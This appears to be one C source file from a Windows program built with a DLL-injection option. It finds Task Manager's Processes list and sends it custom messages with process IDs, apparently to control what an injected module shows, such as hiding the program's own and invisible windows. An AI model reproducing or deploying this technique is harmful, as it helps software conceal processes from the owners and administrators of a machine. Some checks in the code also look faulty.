#include "Compiler Settings.H"

#include <windows.h>

#include "Window__List.H"

#ifdef WANT_DLL_INJECTION

extern HWND chWnd;
HWND g_Processes = NULL;

BOOL CALLBACK FindProcessesChildWindowEnum(HWND hWnd, LPARAM lParam)
{
	char name[256]; 
	GetWindowText(hWnd,name,256);

	char ClassName[256];
	GetClassName(hWnd,ClassName,256);

	if((strcmp(ClassName,"")==0)&&(strcmp(name,"SysHeader32")==0))
		g_Processes = hWnd;

	if (name == NULL)
		return FALSE;
	return TRUE;
}


BOOL CALLBACK FindProcessesWindowEnum(HWND hWnd,LPARAM lParam)
{
	char name[256]; 
	GetWindowText(hWnd,name,256);

	char ClassName[256];
	GetClassName(hWnd,ClassName,256);

	if((strcmp(ClassName,"SysListView32")==0)&&(strcmp(name,"Processes")==0))
		g_Processes = hWnd;

	if (name == NULL)
		return FALSE;
	return TRUE;
}

VOID FindProcessesWindow(HWND hWndStart)
{
	g_Processes = NULL;
	EnumChildWindows(hWndStart, FindProcessesWindowEnum, NULL);
	if (g_Processes != NULL)
		EnumChildWindows(g_Processes, FindProcessesChildWindowEnum, NULL);
}

HWND FindWindowToSendTo(VOID)
{
	HWND hWnd = ::FindWindow(NULL, "Windows Task Manager");
	if (!hWnd)
		return NULL;

	FindProcessesWindow(hWnd);

	return (g_Processes);
}

VOID UpdateTaskManagers_Add(HWND hWnd)
{
	HWND hOut = FindWindowToSendTo( );
	DWORD pid;
	GetWindowThreadProcessId(hWnd, &pid);
	SendMessage(hOut,            0x7050, (WPARAM)0, (LPARAM)pid);
	SendMessage(GetParent(hOut), 0x7050, (WPARAM)0, (LPARAM)pid);
	return;
}

VOID UpdateTaskManagers_Remove(HWND hWnd)
{
	HWND hOut = FindWindowToSendTo( );
	DWORD pid;
	GetWindowThreadProcessId(hWnd, &pid);
	SendMessage(hOut,            0x7051, (WPARAM)0, (LPARAM)pid);
	SendMessage(GetParent(hOut), 0x7051, (WPARAM)0, (LPARAM)pid);
	return;
}

VOID UpdateTaskManagers_RemoveAll(VOID)
{
	HWND hOut = FindWindowToSendTo( );
	SendMessage(hOut,            0x7052, (WPARAM)0, (LPARAM)0);
	SendMessage(GetParent(hOut), 0x7052, (WPARAM)0, (LPARAM)0);
	return;
}

VOID SynchronizeTaskManager(VOID)
{
	struct handle_list_tag *temp;

	UpdateTaskManagers_RemoveAll( );

	UpdateTaskManagers_Add(chWnd);

	if (list_of_handles)
		for (temp = list_of_handles; temp; temp = temp->next)
			if ((GetWindowLong(temp->hWindow, GWL_STYLE) & WS_VISIBLE) == 0)
				UpdateTaskManagers_Add(temp->hWindow);
}

#endif
